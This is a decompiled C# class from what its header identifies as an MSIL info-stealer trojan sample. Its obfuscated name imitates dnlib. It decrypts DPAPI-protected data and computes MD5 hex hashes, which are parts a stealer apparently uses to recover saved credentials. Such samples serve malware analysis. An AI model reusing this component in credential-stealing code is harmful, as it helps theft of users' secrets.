// Decompiled with JetBrains decompiler
// Type: dnlibDotNetPdbDssSymbolWriterImplF
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Collections.Generic;
using System.Globalization;
using System.Security.Cryptography;
using System.Text;

public static class dnlibDotNetPdbDssSymbolWriterImplF
{
  public static string GetDecoded(
    string EncryptedData,
    DataProtectionScope dataProtectionScope,
    byte[] entropy = null)
  {
    return Encoding.UTF8.GetString(dnlibDotNetPdbDssSymbolWriterImplF.DecryptBlob(Encoding.GetEncoding(new string(new char[12]
    {
      'w',
      'i',
      'n',
      'd',
      'o',
      'w',
      's',
      '-',
      '1',
      '2',
      '5',
      '1'
    })).GetBytes(EncryptedData), dataProtectionScope, entropy));
  }

  public static byte[] DecryptBlob(
    byte[] EncryptedData,
    DataProtectionScope dataProtectionScope,
    byte[] entropy = null)
  {
    try
    {
      return EncryptedData == null || EncryptedData.Length == 0 ? (byte[]) null : ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
    }
    catch (Exception ex)
    {
      return (byte[]) null;
    }
  }

  public static string GetMd5Hash(string source) => dnlibDotNetPdbDssSymbolWriterImplF.GetHexString((IList<byte>) new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(source))).Replace("-", string.Empty);

  private static string GetHexString(IList<byte> bt)
  {
    string hexString = string.Empty;
    for (int index = 0; index < bt.Count; ++index)
    {
      int num1 = (int) bt[index];
      int num2 = num1 & 15;
      int num3 = num1 >> 4 & 15;
      string str = num3 <= 9 ? hexString + num3.ToString((IFormatProvider) CultureInfo.InvariantCulture) : hexString + ((char) (num3 - 10 + 65)).ToString((IFormatProvider) CultureInfo.InvariantCulture);
      hexString = num2 <= 9 ? str + num2.ToString((IFormatProvider) CultureInfo.InvariantCulture) : str + ((char) (num2 - 10 + 65)).ToString((IFormatProvider) CultureInfo.InvariantCulture);
      if (index + 1 != bt.Count && (index + 1) % 2 == 0)
        hexString += "-";
    }
    return hexString;
  }
}
